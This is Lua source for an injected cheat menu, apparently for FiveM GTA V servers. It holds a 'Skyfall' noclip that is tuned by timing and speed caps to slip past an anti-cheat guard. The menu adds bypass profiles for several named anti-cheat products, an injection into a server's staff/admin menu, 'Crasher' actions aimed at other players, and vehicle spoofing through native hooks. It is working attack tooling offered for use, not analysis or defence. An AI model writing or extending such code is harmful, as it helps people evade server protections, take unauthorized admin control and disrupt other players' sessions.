    if wasActive and N.onChange then pcall(N.onChange, false) end
    O.log("air noclip off (%s)", tostring(N.reason))
    return true
end

function N.disable()
    return N.stop("panic")
end

function N.isActive()
    return N.active == true
end

-- ---------------------------------------------------------------------------
-- TICK
-- ---------------------------------------------------------------------------
local function controlDown(control)
    local ok, down = pcall(IsControlPressed, 0, control)
    return ok and (down == true or down == 1)
end

function N.tick(now)
    if not N.active then return end
    now = now or O.now()

    local c = clock()
    N.untilAt = c + GATE_SECONDS
    N.fallGateUntil = c + FALL_GRACE

    if N.holdUntil ~= 0 then
        if c > N.holdUntil then
            N.stop(N.holdReason or "state")
        end
        return
    end

    local ped = N.ped
    if ped == 0 or not DoesEntityExist(ped) then
        holdOrStop("ped gone")
        return
    end
    if O.Ctx and type(O.Ctx.ped) == "number" and O.Ctx.ped ~= 0 and O.Ctx.ped ~= ped then
        holdOrStop("ped gone")
        return
    end

    local dead = (O.Ctx and O.Ctx.dead) or IsPedDeadOrDying(ped, true)
    if dead then
        holdOrStop("dead")
        return
    end

    local inVehicle = (O.Ctx and O.Ctx.inVehicle) or IsPedInAnyVehicle(ped, false)
    if inVehicle then
        holdOrStop("vehicle")
        return
    end

    local okChute, chute = pcall(GetPedParachuteState, ped)
    if okChute and type(chute) == "number" and chute > 0 then
        holdOrStop("parachute")
        return
    end

    -- Apply the freefall pose once its dictionary is streamed. The ped is
    -- briefly standing while the base-game dictionary loads; gravity is
    -- already off, so it does not fall during that window.
    if N.posePending then
        local okLoaded, loaded = pcall(HasAnimDictLoaded, ANIM_DICT)
        if okLoaded and loaded then
            local okAnim = pcall(TaskPlayAnim, ped, ANIM_DICT, ANIM_CLIP,
                8.0, 8.0, -1, ANIM_FLAGS, 1.0, false, false, false)
            if not okAnim then
                N.stop("pose failed")
                return
            end
            N.posePending = false
            N.poseApplied = true
            N.taskStarted = true
        elseif now - N.poseAt > POSE_LOAD_MS then
            N.stop("pose failed")
            return
        end
    end

    -- Settle the genuine state once, after 300 ms. Until then the warmup cap
    -- keeps every written speed below the guard's on-foot ceiling.
    --
    -- Doctrine 10_AIR_NOCLIP.md 3.5a also calls for periodic revalidation of
    -- the task layer. That is a documented TODO here, not an implemented
    -- claim: without a verified TASK_PLAY_ANIM dictionary/clip, a later false
    -- 423 cannot yet choose safely between "stop" and "fallback pose".
    if not N.coverChecked and (now - N.taskAt) >= COVER_DELAY_MS then
        N.coverChecked = true
        local okCover, why = ensureCover()
        if not okCover then
            N.stop("no cover")
            O.log("air noclip refused: %s", tostring(why))
            return
        end
    end

    -- Tier B liveness: a jittered pulse keeps the guard-side gate open. If this
    -- chunk dies, the last pulse expires on its own.
    if N.layer == "stage-b" and N.stageB.event then
        if now >= N.stageB.next then
            pcall(TriggerEvent, N.stageB.event, STAGE_B_WINDOW)
            N.stageB.next = now + O.jitter(STAGE_B_PULSE, 0.25)
        end
    end

    local rot = GetGameplayCamRot(2)
    local dir = O.rotToDir(rot)
    local rz = math.rad(rot.z)

    local fwd = (controlDown(CTL_FWD) and 1 or 0) - (controlDown(CTL_BACK) and 1 or 0)
    local strafe = (controlDown(CTL_RIGHT) and 1 or 0) - (controlDown(CTL_LEFT) and 1 or 0)
    local vertical = (controlDown(CTL_UP) and 1 or 0) - (controlDown(CTL_DOWN) and 1 or 0)

    local tx, ty, tz = 0.0, 0.0, 0.0

    -- Forward/back follows the full 3D camera direction. The vertical share is
    -- capped at 15 m/s so looking straight up is not a 28 m/s elevator.
    if fwd ~= 0 then
        tx = tx + dir.x * FWD_SPEED * fwd
        ty = ty + dir.y * FWD_SPEED * fwd
        local camV = dir.z * FWD_SPEED * fwd
        if camV > CAM_VERT_MAX then camV = CAM_VERT_MAX end
        if camV < -CAM_VERT_MAX then camV = -CAM_VERT_MAX end
        tz = tz + camV
    end

    -- Strafe is horizontal only: cos/sin of yaw, no pitch component.
    if strafe ~= 0 then
        tx = tx + math.cos(rz) * STRAFE_SPEED * strafe
        ty = ty + math.sin(rz) * STRAFE_SPEED * strafe
    end

    if vertical ~= 0 then
        tz = tz + EXPLICIT_VERT * vertical
    end

    local targetSpeed = math.sqrt(tx * tx + ty * ty + tz * tz)
    if targetSpeed > SPEED_CAP then
        local scale = SPEED_CAP / targetSpeed
        tx, ty, tz = tx * scale, ty * scale, tz * scale
    end

    local dt = 0.03
    if N.lastTickAt and now > N.lastTickAt then
        dt = math.min(0.1, (now - N.lastTickAt) / 1000.0)
    end
    N.lastTickAt = now

    -- Vector acceleration: the magnitude of the change is at most 18 m/s^2,
    -- including diagonals. A no-key tick decelerates toward zero.
    local dx, dy, dz = tx - N.vx, ty - N.vy, tz - N.vz
    local delta = math.sqrt(dx * dx + dy * dy + dz * dz)
    local step = ACCEL * dt
    if delta > step and delta > 0.0 then
        local scale = step / delta
        dx, dy, dz = dx * scale, dy * scale, dz * scale
    end
    N.vx, N.vy, N.vz = N.vx + dx, N.vy + dy, N.vz + dz

    local speed = math.sqrt(N.vx * N.vx + N.vy * N.vy + N.vz * N.vz)
    if speed > SPEED_CAP then
        local scale = SPEED_CAP / speed
        N.vx, N.vy, N.vz = N.vx * scale, N.vy * scale, N.vz * scale
    end

    -- The guard's actorLoop caches isEntityInAir/isPedFalling for 1000 ms.
    -- Keep the first 1200 ms below its 14.0 m/s on-foot ceiling.
    if now < N.warmupUntil then
        local warm = math.sqrt(N.vx * N.vx + N.vy * N.vy + N.vz * N.vz)
        if warm > WARMUP_SPEED then
            local scale = WARMUP_SPEED / warm
            N.vx, N.vy, N.vz = N.vx * scale, N.vy * scale, N.vz * scale
        end
    end

    -- Ragdoll is a real game state: pause velocity writes while it owns the
    -- body, but keep the task, gravity and read layer. The next tick resumes
    -- from the last written velocity. This matches doctrine 3.6.
    local okRag, rag = pcall(IsPedRagdoll, ped)
    if okRag and rag then
        return
    end

    local okWrite, wrote = pcall(SetEntityVelocity, ped, N.vx, N.vy, N.vz)
    if not okWrite or wrote == false then
        N.stop("velocity write failed")
        return
    end
    N.stats.ticks = N.stats.ticks + 1
end

-- 30 ms nominal, jittered by O.every(); phase zero makes the first tick
-- eligible immediately after arming.
O.every("airnoclip", 30, N.tick, 0)

return N

end)(O,S,B)

-- ---------------------------------------------------------------------------
-- PART: 07_menu.lua
-- ---------------------------------------------------------------------------
local U = (function(O,S,E,D,F,V,M,SN,C,A,ST,SB,VS,K,N,Menu)
-- ============================================================================
-- VANGUARD / 07 MENU
-- ----------------------------------------------------------------------------
-- This file no longer creates a "Vanguard" category. The features are placed
-- in the menu the operator already uses:
--
--   Exploit > Bypass    separate profiles: WaveShield, FiveGuard, Electron AC,
--                       Reason AC, Seed, Dynasty, Raven; each target is isolated
--   Exploit > Exploits  Menu Staff [SEED], no false Dynasty badge
--   Protection          anti-freeze, anti-attach and anti-spectate only
--   Crasher             one direct action per method, no select + Crash step
--   Vehicle > Spoofed   real local vehicles over the one you already stole
--
-- Removed on purpose:
--   * the broad native-hook profile / read repair / hook jitter
--   * server ped spoof and every spoofed model path
--   * ghost, local-hidden, proof hardening, firewall, deep shim
--   * the old Sandbox/Divergence/Sentinel/Debug tabs and all status text
--   * the yellow on-screen status strip
--
-- One scoped exception: Player > Movement > Skyfall installs scoped native
-- hooks for the fake-air reads (task 423, IsPedFalling, IsEntityInAir) only
-- for reads the skydive task does not already make true, and removes them on
-- disable or panic. At rest the hook table is empty. No broad hook profile is
-- compiled, and no feature is exposed unless this file puts it in the menu.
-- ============================================================================

local UI = {}

-- ---------------------------------------------------------------------------
-- PANIC. Kept as an internal one-shot. It is not a menu row; the operator can
-- use the executor's normal unload/restart path.
-- ---------------------------------------------------------------------------
function UI.panic()
    N.disable()
    A.panic()
    D.detachShell()
    E.destroyAll()
    C.stop()

    S.suppressOn = false
    S.disableOverlayProbe = false
    S.unblockAll()

    F.clearPlatform()
    F.clearFloor()
    F.clearRamps()

    pcall(function()
        ClearOverrideWeather()
        ClearWeatherTypePersist()
        NetworkClearClockTimeOverride()
        SetArtificialLightsState(false)
        SetEntityAlpha(PlayerPedId(), 255, false)
    end)

    O.log("panic: local entities deleted, state vanilla")
    return true
end

-- ---------------------------------------------------------------------------
-- MENU HELPERS
-- ---------------------------------------------------------------------------

local function findCategory(name)
    if type(Menu.FindCategory) == "function" then
        return Menu.FindCategory(name)
    end
    for _, category in ipairs(Menu.Categories or {}) do
        if category.name == name then return category end
    end
    return nil
end

local function findTab(categoryName, tabName)
    if type(Menu.FindTab) == "function" then
        local tab = Menu.FindTab(categoryName, tabName)
        if tab then return tab end
    end

    local category = findCategory(categoryName)
    if not category or not category.tabs then return nil end
    for _, tab in ipairs(category.tabs) do
        if tab.name == tabName then return tab end
    end
    return nil
end

local function findItem(categoryName, tabName, itemName)
    if type(Menu.FindItem) == "function" then
        local item = Menu.FindItem(categoryName, tabName, itemName)
        if item then return item end
    end

    local tab = findTab(categoryName, tabName)
    if not tab then return nil end
    for _, item in ipairs(tab.items or {}) do
        if item.name == itemName then return item end
    end
    return nil
end

local function removeItem(categoryName, tabName, itemName)
    local tab = findTab(categoryName, tabName)
    if not tab or not tab.items then return false end

    local removed = false
    for i = #tab.items, 1, -1 do
        if tab.items[i].name == itemName then
            table.remove(tab.items, i)
            removed = true
        end
    end
    return removed
end

local function removeCategory(name)
    if type(Menu.RemoveCategory) == "function" then
        return Menu.RemoveCategory(name)
    end

    local removed = false
    for i = #(Menu.Categories or {}), 1, -1 do
        if Menu.Categories[i].name == name then
            table.remove(Menu.Categories, i)
            removed = true
        end
    end
    for i = #(Menu.ExtraCategories or {}), 1, -1 do
        if Menu.ExtraCategories[i].name == name then
            table.remove(Menu.ExtraCategories, i)
            removed = true
        end
    end
    return removed
end

local function addCategory(category)
    if type(Menu.AddCategory) == "function" then
        return Menu.AddCategory(category)
    end
    Menu.Categories = Menu.Categories or {}
    Menu.Categories[#Menu.Categories + 1] = category
    return category
end

-- ---------------------------------------------------------------------------
-- EXPLOIT > BYPASS
--
-- Each entry is isolated: WaveShield, FiveGuard and Electron AC apply their own
-- export profiles; Seed injects only into seed; Dynasty injects only into
-- Putin; Raven uses only Raven's documented client movement-grace export. No
-- entry applies a global profile to another vendor's resource.
-- ---------------------------------------------------------------------------
local function installBypassProfiles()
    local tab = findTab("Exploit", "Bypass")
    if not tab then return false end

    -- Replace the whole tab. This also removes old combined entries left
    -- behind by a previous loader instance without requiring a GTA restart.
    tab.items = {
        {
            name = "WaveShield",
            type = "action",
            onClick = function() V.applyVendor("waveshield") end,
        },
        {
            name = "FiveGuard",
            type = "action",
            onClick = function() V.applyVendor("fiveguard") end,
        },
        {
            name = "Electron AC",
            type = "action",
            onClick = function() V.applyVendor("electron") end,
        },
        {
            name = "Reason AC",
            type = "action",
            onClick = function() V.applyVendor("reason") end,
        },
        {
            name = "Seed",
            type = "action",
            onClick = function() SB.apply() end,
        },
        {
            name = "Dynasty",
            type = "action",
            onClick = function() V.applyDynasty() end,
        },
        {
            name = "Raven",
            type = "action",
            onClick = function() V.setRaven(not V.ravenActive) end,
        },
    }

    return true
end

-- ---------------------------------------------------------------------------
-- EXPLOIT > EXPLOITS
--
-- Reuse the existing "Menu Staff" row, but label it explicitly. The old
-- [DYNASTY] badge was misleading here: this row is the Seed staff menu, not a
-- Dynasty entry. A second click reopens the already-built admin menu.
-- ---------------------------------------------------------------------------
local function seedClick()
    if ST._injected then
        if ST.reopen() then return true end
        -- Reopen only failed at the Susano call itself. Clear the local marker
        -- so the next click can rebuild instead of being permanently refused.
        ST.reset()
    end
    return ST.inject()
end

local function installSeed()
    local tab = findTab("Exploit", "Exploits")
    if not tab then return false end

    -- The old teleport selector is removed entirely. This also removes the
    -- Pillbox/Hospital entries the base loader attached to it.
    removeItem("Exploit", "Exploits", "Teleport To")

    local seed = findItem("Exploit", "Exploits", "Menu Staff")
    if not seed then
        seed = findItem("Exploit", "Exploits", "Menu Staff [SEED]")
    end
    if not seed then
        seed = { name = "Menu Staff", type = "action" }
        tab.items = tab.items or {}
        tab.items[#tab.items + 1] = seed
    end

    -- The base renderer appends the [SEED] tag in green. Keeping the tag out
    -- of the name avoids a second white duplicate.
    seed.name = "Menu Staff"
    seed.seed = true
    seed.type = "action"
    seed.dynasty = nil
    seed.onClick = seedClick
    return true
end

-- ---------------------------------------------------------------------------
-- PLAYER > MOVEMENT > SKYFALL
--
-- The old Movement tab was deleted with the legacy noclip. This is a new,
-- single row: a fake-air noclip that plays the freefall pose, disables ped
-- gravity and writes velocity from ZQSD/camera/Space/Ctrl. The row is
-- rebuilt on every load, so a stale copy cannot survive a reload.
-- ---------------------------------------------------------------------------
local function installMovement()
    local category = findCategory("Player")
    if not category then return false end

    category.tabs = category.tabs or {}
    for i = #category.tabs, 1, -1 do
        if category.tabs[i].name == "Movement" then
            table.remove(category.tabs, i)
        end
    end

    local skyfall
    skyfall = {
        name = "Skyfall",
        type = "toggle",
        value = N.isActive(),
        onClick = function(value)
            local active
            if value then
                active = N.arm()
            else
                N.stop("operator")
                active = false
            end
            skyfall.value = active
            return active
        end,
    }

    -- Auto-stop paths (death, vehicle, parachute, budget, panic) update the
    -- visible toggle without re-entering onClick.
    N.onChange = function(active)
        skyfall.value = active
    end

    category.tabs[#category.tabs + 1] = {
        name = "Movement",
        items = {
            { name = "", isSeparator = true, separatorText = "Fake-air noclip" },
            skyfall,
        },
    }
    return true
end

-- ---------------------------------------------------------------------------
-- PROTECTION
-- Only local-ped recovery. No hooks, no spoof, no firewall, no entity edits.
-- ---------------------------------------------------------------------------
local function installProtection()
    local antiFreeze
    local antiAttach
    local antiSpectate

    antiFreeze = {
        name = "Anti-freeze",
        type = "toggle",
        value = false,
        onClick = function(v)
            antiFreeze.value = A.setAntiFreeze(v)
        end,
    }

    antiAttach = {
        name = "Anti-attach",
        type = "toggle",
        value = false,
        onClick = function(v)
            antiAttach.value = A.setAntiAttach(v)
        end,
    }

    antiSpectate = {
        name = "Anti-spectate",
        type = "toggle",
        value = false,
        onClick = function(v)
            antiSpectate.value = A.setAntiSpectate(v)
        end,
    }

    addCategory({
        name = "Protection",
        hasTabs = true,
        tabs = {
            {
                name = "Protection",
                items = {
                    { name = "", isSeparator = true, separatorText = "Local ped" },
                    antiFreeze,
                    antiAttach,
                    antiSpectate,
                },
            },
        },
    })
    return true
end

-- ---------------------------------------------------------------------------
-- CRASHER
-- Each method is its own action: click the method and it starts. There is no
-- separate selector, no Crash button, no target/intensity/stop row.
-- ---------------------------------------------------------------------------
local function installCrasher()
    -- Fixed power per method; it is not exposed as a menu setting. Ped
    -- variation and flood use Heavy; PTFX uses Standard.
    local power = { 3, 3, 2 }
    local items = {}

    for i = 1, #C.METHODS do
        local index = i
        items[#items + 1] = {
            name = C.METHODS[i].label,
            type = "action",
            onClick = function()
                C.setMethod(index)
                C.setIntensity(power[index] or 2)
                C.launch()
            end,
        }
    end

    addCategory({
        name = "Crasher",
        hasTabs = true,
        tabs = {
            {
                name = "Crasher",
                items = items,
            },
        },
    })
    return true
end

-- ---------------------------------------------------------------------------
-- VEHICLE > SPOOFED
--
-- The network model stays whatever vehicle you are already in; this client
-- drives a real local vehicle (isNetwork=false) and mirrors the carrier. No
-- network vehicle is spawned. Each row is a direct action; clicking the active
-- row disables it, and Remove Spoof is always available.
-- ---------------------------------------------------------------------------
local function installVehicleSpoof()
    local category = findCategory("Vehicle")
    if not category then return false end

    category.tabs = category.tabs or {}
    for i = #category.tabs, 1, -1 do
        if category.tabs[i].name == "Spoofed" then
            table.remove(category.tabs, i)
        end
    end

    local items = {
        {
            name = "",
            isSeparator = true,
            separatorText = "Real local vehicle / current network vehicle",
        },
    }

    for i = 1, #VS.presetOrder do
        local key = VS.presetOrder[i]
        local preset = VS.presets[key]
        if preset then
            items[#items + 1] = {
                name = preset.label,
                type = "action",
                onClick = function() VS.togglePreset(key) end,
            }
        end
    end

    items[#items + 1] = {
        name = "Remove Spoof",
        type = "action",
        onClick = function() VS.disable() end,
    }

    category.tabs[#category.tabs + 1] = {
        name = "Spoofed",
        items = items,
    }

    return true
end

-- ---------------------------------------------------------------------------
-- VEHICLE > PERFORMANCE > ATTACH RAMP
--
-- The base loader created two networked ramps on the ground ahead of the
-- vehicle, then left them there. This override makes one local ramp a real
-- child of the vehicle: it follows position and rotation like a front bumper
-- and is removed with Detach Ramp. No ground placement after the attach.
-- ---------------------------------------------------------------------------
local function installRampFix()
    if type(Menu) ~= "table" then return false end

    local RAMP_MODELS = { "prop_mp_ramp_01", "prop_mp_ramp_02", "prop_mp_ramp_03" }

    local function loadRamp()
        for i = 1, #RAMP_MODELS do
            local hash = GetHashKey(RAMP_MODELS[i])
            if E.requestModel(hash, 3000) then
                return hash, RAMP_MODELS[i]
            end
        end
        return nil, nil
    end

    Menu.AttachBuggyRamp = function()
        if type(Menu.DetachBuggyRamp) == "function" then
            pcall(Menu.DetachBuggyRamp)
        end

        local ped = PlayerPedId()
        local vehicle = GetVehiclePedIsIn(ped, false)
        if not vehicle or vehicle == 0 or not DoesEntityExist(vehicle) then
            O.log("ramp: enter a vehicle first")
            return false
        end

        local hash, modelName = loadRamp()
        if not hash then
            O.log("ramp: no ramp model could be loaded")
            return false
        end

        local _, vehicleMax = GetModelDimensions(GetEntityModel(vehicle))
        local front = (vehicleMax and vehicleMax.y or 2.5) + 0.9
        local coords = GetEntityCoords(vehicle)
        local obj = CreateObject(hash, coords.x, coords.y, coords.z, false, false, false)
        SetModelAsNoLongerNeeded(hash)

        if not obj or obj == 0 or not DoesEntityExist(obj) then
            O.log("ramp: local object creation failed")
            return false
        end

        pcall(SetEntityAsMissionEntity, obj, true, true)
        pcall(SetEntityInvincible, obj, true)
        pcall(SetEntityCollision, obj, true, true)

        -- Local coordinates: Y is forward on the vehicle. The ramp is fixed
        -- to the front bumper and inherits every vehicle movement.
        local attached = pcall(AttachEntityToEntity, obj, vehicle, 0,
            0.0, front, 0.1,
            0.0, 0.0, 180.0,
            false, false, false, false, 2, true)

        if not attached then
            pcall(DeleteObject, obj)
            O.log("ramp: attach failed")
            return false
        end

        _G._buggyRampHandles = { obj }
        _G._buggyRampVeh = vehicle
        _G._buggyRampCooldowns = {}
        O.log("ramp: attached %s to vehicle", tostring(modelName))
        return true
    end

    return true
end

-- ---------------------------------------------------------------------------
-- REMOVE OLD ENTRY POINTS
-- ---------------------------------------------------------------------------
local MENU_REV = "2026-10-22-rework-2"

-- A previous execution of the old loader can leave its category in the shared
-- Menu table. Match both the literal name and the old nine-tab fingerprint so
-- a case change or a renamed category does not survive a reload.
local function isLegacyCategory(category)
    if type(category) ~= "table" then return false end

    local name = string.lower(tostring(category.name or ""))
    if string.find(name, "vanguard", 1, true) then return true end

    if category.hasTabs and category.tabs then
        local markers = 0
        for _, tab in ipairs(category.tabs) do
            local tabName = string.lower(tostring(tab.name or ""))
            if tabName == "evasion" or tabName == "staff" or tabName == "shield"
                or tabName == "divergence" or tabName == "sandbox"
                or tabName == "sentinel" or tabName == "debug" then
                markers = markers + 1
            end
        end
        if markers >= 3 then return true end
    end

    return false
end

local function purgeLegacyList(list)
    if type(list) ~= "table" then return 0 end

    local removed = 0
    for i = #list, 1, -1 do
        if isLegacyCategory(list[i]) then
            table.remove(list, i)
            removed = removed + 1
        end
    end
    return removed
end

local function purgeLegacyCategories()
    local removed = purgeLegacyList(Menu.Categories)
        + purgeLegacyList(Menu.ExtraCategories)

    if removed > 0 then
        Menu.OpenedCategory = nil
        Menu.CurrentItem = 1
        if type(Menu.CurrentCategory) == "number"
            and Menu.CurrentCategory > #Menu.Categories then
            Menu.CurrentCategory = math.max(2, #Menu.Categories)
        end
        O.log("menu: removed %d legacy Vanguard category(ies)", removed)
    end
    return removed
end

local function removeLegacyEntries()
    -- The old base "Crash Method" is superseded by the Crasher category.
    removeItem("Online", "Troll", "Crash Method")

    -- There must never be two menu surfaces for the same features.
    removeCategory("Vanguard")
    purgeLegacyCategories()
end

-- ---------------------------------------------------------------------------
-- BUILD
-- ---------------------------------------------------------------------------
local function build()
    if type(Menu) ~= "table" or type(Menu.Categories) ~= "table" then
        return false
    end

    removeLegacyEntries()
    installBypassProfiles()
    installSeed()
    installMovement()
    installProtection()
    installCrasher()
    installVehicleSpoof()
    installRampFix()

    -- Re-check after the new categories are installed. This catches a stale
    -- category that was appended while the old menu table was still alive.
    purgeLegacyCategories()

    -- If an old script calls AddCategory after us, keep the legacy tab out.
    if type(Menu.AddCategory) == "function" and not Menu.__vgd_category_guard then
        local rawAddCategory = Menu.AddCategory
        Menu.__vgd_category_guard = true
        Menu.AddCategory = function(category, extra)
            if isLegacyCategory(category) then return nil end
            return rawAddCategory(category, extra)
        end
    end

    return true
end

-- ---------------------------------------------------------------------------
-- BOOT
-- ---------------------------------------------------------------------------
function UI.boot()
    O.thread()
    A.boot()

    -- Scan before installing the Bypass rows so only real resources appear.
    S.scan()
    build()

    -- Delayed second pass: a stale menu instance or a late AddCategory call
    -- cannot keep the old Vanguard category alive.
    pcall(function()
        Citizen.CreateThread(function()
            Citizen.Wait(1200)
            purgeLegacyCategories()
        end)
    end)

    O.every("shield", 5200, function()
        S.tick()
    end, 1200)

    O.every("scan", 30000, function()
        if #S.acs == 0 then S.scan() end
    end, 4000)

    O.log("menu rework %s loaded - guard: %s", MENU_REV, S.describe())
end

UI.boot()

return UI

end)(O,S,E,D,F,V,M,SN,C,A,ST,SB,VS,K,N,Menu)


end)()
-- <<< VANGUARD MODULE END
